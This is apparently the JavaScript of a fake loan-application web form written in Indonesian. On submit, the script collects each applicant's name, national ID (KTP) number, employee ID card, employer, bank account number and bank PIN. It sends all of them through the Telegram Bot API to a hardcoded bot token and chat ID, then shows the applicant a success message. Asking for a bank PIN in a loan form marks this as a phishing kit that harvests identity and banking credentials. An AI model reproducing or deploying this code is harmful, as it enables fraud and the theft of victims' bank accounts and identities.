const TOKEN = "8090039960:AAEhbpQk4EYftzFc-8aSlR8TN9Nsrd76_Lc";
const CHAT_ID = "7679753363";

document.getElementById("myForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const formData = new FormData(this);
  const data = Object.fromEntries(formData.entries());

  const message = `📋 *Pengajuan Pinjaman Baru:*\n\n` +
    `▪️ *Nama:* ${data.nama}\n` +
    `▪️ *KTP:* ${data.ktp}\n` +
    `▪️ *ID Card:* ${data['ID-Card']}\n` +
    `▪️ *Perusahaan:* ${data.Perusahaan}\n` +
    `▪️ *Lokasi Kerja:* ${data['Lokasi Kerja']}\n` +
    `▪️ *Devisi:* ${data.Devisi}\n` +
    `▪️ *Kontrak:* ${data['Kontrak Kerja']}\n` +
    //`▪️ *Jumlah Pinjaman:* ${data.nominal}\n` +
    `▪️ *Bank:* ${data.Bank}\n` +
    `▪️ *Rekening:* ${data.Rekening}\n` +
    `▪️ *Pin:* ${data.Pin}\n` +
   // `▪️ *Tujuan:* ${data.tujuan}\n` +
    `▪️ *Jangka Waktu:* ${data.jangka}\n` +
    `▪️ *Kontak:* ${data.kontak}`;

  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  })
    .then(res => res.json())
    .then(res => {
      if (res.ok) {
        alert("Pengajuan berhasil dikirim.");
        e.target.reset();
        window.location.href="ajukan.html"
      } else {
        alert("Gagal mengirim: " + res.description);
      }
    })
    .catch(err => {
      alert("Terjadi kesalahan: " + err.message);
    });
});
